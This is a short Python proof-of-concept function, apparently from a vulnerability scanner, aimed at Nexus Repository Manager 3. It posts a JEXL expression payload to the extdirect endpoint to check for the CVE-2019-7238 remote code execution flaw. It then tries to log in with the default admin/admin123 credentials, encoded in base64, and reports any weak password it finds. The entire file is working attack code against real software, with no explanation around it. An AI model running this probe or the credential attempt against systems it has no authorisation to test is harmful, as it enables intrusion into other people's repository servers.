import json

import requests


def poc(host, port, timeout):
    """
    cve-2019-7238
    """
    try:
        cve_2019_7238_url = f"http://{host}:{port}/service/extdirect"
        headers = {"Content-Type": "application/json"}
        data = {"action": "coreui_Component", "data": [
            {"filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "1==1"}, {
                "property": "type", "value": "jexl"}], "limit": 50, "page": 1,
             "sort": [{"direction": "ASC", "property": "name"}], "start": 0}], "method": "previewAssets", "tid": 18,
                "type": "rpc"}
        r = requests.post(cve_2019_7238_url, headers=headers, timeout=timeout, json=data, verify=False,
                          allow_redirects=False)
        if r.status_code == 200 and json.loads(r.text)['result']['total'] > 0:
            return "Nexus Repository Manager 3 RCE"
    except:
        # traceback.print_exc()
        pass
    # 弱口令
    try:
        r = requests.get(f"http://{host}:{port}", timeout=timeout, allow_redirects=True, verify=False)
        if "Nexus" in r.text:
            data = {
                "username": "YWRtaW4=",  # base64.b64encode("admin".encode()).decode(),
                "password": "YWRtaW4xMjM="  # base64.b64encode("admin123".encode()).decode()
            }
            r = requests.post(f"http://{host}:{port}/service/rapture/session", data=data, timeout=timeout,
                              allow_redirects=False, verify=False)
            if r.status_code == 204 or r.status_code == 405:
                return f"Nexus Repository Manager weakpass:admin/admin123"
            else:
                return "dectect Nexus Repository Manager service"
    except Exception as e:
        pass
    return None
